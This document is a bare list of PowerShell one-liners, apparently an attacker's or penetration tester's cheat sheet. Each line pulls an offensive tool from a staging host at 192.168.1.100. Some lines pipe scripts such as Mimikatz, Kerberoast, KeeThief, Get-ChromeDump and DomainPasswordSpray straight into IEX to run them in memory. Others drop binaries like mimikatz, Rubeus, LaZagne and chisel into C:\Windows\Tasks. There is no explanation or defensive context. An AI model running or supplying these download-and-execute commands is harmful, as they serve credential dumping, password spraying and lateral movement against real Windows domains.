(new-object system.net.webclient).downloadstring('http://192.168.1.100/PowerView.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Brute-LocAdmin.ps1 ') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Copy-VSS.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Find-PSServiceAccounts.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Find-WMILocalAdminAccess.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-ComputerInfo.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-GPPAutologon.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-GPPPassword.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-HttpStatus.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-LocAdm.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-UserInfo.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/GetUserSPNs.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-VaultCredential.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-WLANPass.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/HostEnum.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Invoke-EDRChecker.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Invoke-Pbind.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Kerberoast.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/LAPSCredential.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Mimikatz.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Out-Minidump.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/PortScanner.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/PowerView.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/SecurityAssessment.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/SharpHound.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/VolumeShadowCopy.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/KeeThief.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Invoke-ACLScanner.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/ACLight/ACLight2.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/ADModule/Import-ActiveDirectory.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/ADRecon/ADRecon.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/ASREPRoast/ASREPRoast.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/BrowersData/Get-BrowserData.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/BrowersData/Get-ChromeDump.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/DomainPasswordSpray/DomainPasswordSpray.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-LAPSPasswords/Get-LAPSPasswords.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Get-SPN/Get-SPN.psm1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Inveigh/Inveigh-Relay.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/LAPSToolkit/LAPSToolkit.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/NetCease/NetCease.psd1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/PoisonHandler/Execute-PoisonHandler.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/PowerSCCM/PowerSCCM.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/PowerUpSQL/PowerUpSQL.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/Powermad/Powermad.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/WSMan-WinRM/WSManWinRM.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/kerberoast/GetUserSPNs.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/powercat/powercat.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://192.168.1.100/WSUSpendu/WSUSpendu.ps1') | IEX
Invoke-WebRequest -URI http://192.168.1.100/ADReaper/ADReaper.exe -OutFile C:\Windows\Tasks\ADReaper.exe
Invoke-WebRequest -URI http://192.168.1.100/Certify/Certify.exe -OutFile C:\Windows\Tasks\Certify.exe
Invoke-WebRequest -URI http://192.168.1.100/LaZagne/lazagne.exe -OutFile C:\Windows\Tasks\lazagne.exe
Invoke-WebRequest -URI http://192.168.1.100/Responder-Windows/binaries/Responder/MultiRelay.exe -OutFile C:\Windows\Tasks\MultiRelay.exe
Invoke-WebRequest -URI http://192.168.1.100/Responder-Windows/binaries/Responder/Responder.exe -OutFile C:\Windows\Tasks\Responder.exe
Invoke-WebRequest -URI http://192.168.1.100/Rubeus/Rubeus.exe -OutFile C:\Windows\Tasks\Rubeus.exe
Invoke-WebRequest -URI http://192.168.1.100/SCShell/SCShell.exe -OutFile C:\Windows\Tasks\SCShell.exe
Invoke-WebRequest -URI http://192.168.1.100/SafetyKatz/SafetyKatz.exe -OutFile C:\Windows\Tasks\SafetyKatz.exe 
Invoke-WebRequest -URI http://192.168.1.100/Seatbelt/Seatbelt.exe -OutFile C:\Windows\Tasks\Seatbelt.exe 
Invoke-WebRequest -URI http://192.168.1.100/SharpDPAPI/SharpDPAPI.exe -OutFile C:\Windows\Tasks\SharpDPAPI.exe
Invoke-WebRequest -URI http://192.168.1.100/SharpUp/SharpUp.exe -OutFile C:\Windows\Tasks\SharpUp.exe
Invoke-WebRequest -URI http://192.168.1.100/SharpView/SharpView.exe -OutFile C:\Windows\Tasks\SharpView.exe
Invoke-WebRequest -URI http://192.168.1.100/SharpWMI/SharpWMI.exe -OutFile C:\Windows\Tasks\SharpWMI.exe
Invoke-WebRequest -URI http://192.168.1.100/Snaffler/Snaffler.exe -OutFile C:\Windows\Tasks\Snaffler.exe
Invoke-WebRequest -URI http://192.168.1.100/chisel/chisel.exe -OutFile C:\Windows\Tasks\chisel.exe
Invoke-WebRequest -URI http://192.168.1.100/mimikatz/x64/mimikatz.exe -OutFile C:\Windows\Tasks\mimikatz.exe
Invoke-WebRequest -URI http://192.168.1.100/Group3r/Group3r.exe -OutFile C:\Windows\Tasks\Group3r.exe
